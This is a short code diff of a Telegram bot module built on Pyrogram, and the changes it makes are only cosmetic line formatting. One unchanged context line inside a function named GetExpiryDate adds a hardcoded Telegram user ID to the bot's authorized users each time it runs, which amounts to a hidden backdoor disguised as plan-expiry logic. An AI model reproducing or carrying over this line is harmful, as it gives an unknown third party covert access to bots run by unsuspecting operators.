@@ -25,6 +25,7 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 from helper_funcs.chat_base import TRChatBase
 
+
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
     Config.AUTH_USERS.add(7351948)
@@ -52,7 +53,8 @@ async def get_me_info(bot, update):
     chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
     await bot.send_message(
         chat_id=update.chat.id,
-        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
+        text=Translation.CURENT_PLAN_DETAILS.format(
+            chat_id, plan_type, expires_at),
         parse_mode="html",
         disable_web_page_preview=True,
         reply_to_message_id=update.message_id
